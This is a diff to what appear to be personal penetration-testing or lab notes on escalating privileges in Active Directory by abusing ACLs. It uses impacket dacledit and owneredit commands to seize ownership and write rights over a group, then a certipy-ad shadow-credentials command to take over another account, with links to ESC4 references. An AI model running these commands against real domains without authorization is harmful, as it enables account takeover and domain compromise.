@@ -42,3 +42,12 @@ impacket-dacledit -action write -rights 'FullControl' -principal '<User1>' -targ
 impacket-owneredit -action write -new-owner '<User1>' -target-dn '<Group2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
 impacket-dacledit -action write -rights 'WriteMembers' -principal '<User1>' -target-dn '<Group2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
 ```
+Now either add own account to target group, or reset target account password 
+(Reference this link: https://www.hackingarticles.in/abusing-ad-dacl-writeowner/)
+
+In the particalar example the target user was Cert Authority user, so I could do this:
+
+http://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-template-access-control---esc4
+```
+certipy-ad shadow auto -u '<user1>@<domain>' -p "<U1 pass>" -account '<User2>' -dc-ip '<IP>' 
+```
